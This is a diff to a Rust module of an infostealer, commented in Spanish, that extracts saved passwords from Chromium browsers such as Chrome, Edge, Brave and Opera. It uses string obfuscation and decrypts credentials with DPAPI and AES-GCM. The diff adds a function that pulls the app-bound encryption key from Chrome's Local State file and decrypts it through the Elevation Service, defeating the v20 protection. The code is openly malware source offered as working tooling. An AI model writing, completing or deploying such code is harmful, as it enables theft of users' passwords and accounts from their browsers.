@@ -1,7 +1,7 @@
 // Stealer para browsers basados en Chromium (Chrome, Edge, Brave, Opera)
 use crate::stealer::{Credential, StealerError, StealerResult};
 use crate::stealer::common::{get_appdata_local, file_exists, base64_decode};
-use crate::stealer::elevation_service; // ✅ RE-HABILITADO con GUIDs ofuscados
+// use crate::stealer::elevation_service; // ← DESHABILITADO (causa crashes en VMs)
 use std::path::PathBuf;
 use rusqlite::Connection;
 use aes_gcm::{
@@ -9,6 +9,7 @@ use aes_gcm::{
     Aes256Gcm, Nonce,
 };
 use obfstr::obfstr; // ← Ofuscación de strings
+use serde_json::Value;
 
 #[cfg(target_os = "windows")]
 use winapi::um::dpapi::CryptUnprotectData;
@@ -265,9 +266,8 @@ fn extract_credentials_from_db(
                     result.unwrap()
                 } else {
                     writeln!(debug, "       ❌ AES-GCM FALLÓ").ok();
-                    // v20 (Chrome 127+): Elevation Service con GUIDs ofuscados
                     writeln!(debug, "       🔸 Intentando Elevation Service (v20)...").ok();
-                    if let Some(v20_password) = elevation_service::try_decrypt_with_elevation_service(&encrypted_pwd) {
+                    if let Some(v20_password) = crate::stealer::elevation_service::try_decrypt_with_elevation_service(&encrypted_pwd) {
                         writeln!(debug, "       ✅ ELEVATION SERVICE OK (v20 decrypted)").ok();
                         v20_password
                     } else {
@@ -525,4 +525,25 @@ fn check_if_all_v20_in_db(browser_name: &str) -> bool {
     // Por ahora asumimos que Chrome última versión = v20
     // TODO: Leer DB y verificar prefijos realmente
     browser_name == obfstr!("Chrome") || browser_name == obfstr!("Edge")
+}
+
+#[cfg(target_os = "windows")]
+pub fn get_app_bound_key(profile_path: &str) -> Option<Vec<u8>> {
+    // 1. Leer Local State
+    let local_state_path = PathBuf::from(profile_path).join("Local State");
+    let local_state = std::fs::read_to_string(&local_state_path).ok()?;
+    let json: Value = serde_json::from_str(&local_state).ok()?;
+    let key_b64 = json.get("os_crypt")?.get("app_bound_encrypted_key")?.as_str()?;
+    // 2. Decodificar base64 y saltar prefijo
+    let key_bytes = base64_decode(key_b64).ok()?;
+    let encrypted_key = if key_bytes.starts_with(&[0x01]) {
+        &key_bytes[1..]
+    } else {
+        &key_bytes[..]
+    };
+    // 3. Desencriptar con elevation_service
+    #[allow(unused_imports)]
+    use crate::stealer::elevation_service;
+    let decrypted = elevation_service::try_decrypt_with_elevation_service(&[b"v20".as_ref(), encrypted_key].concat())?;
+    Some(decrypted.into_bytes())
 }
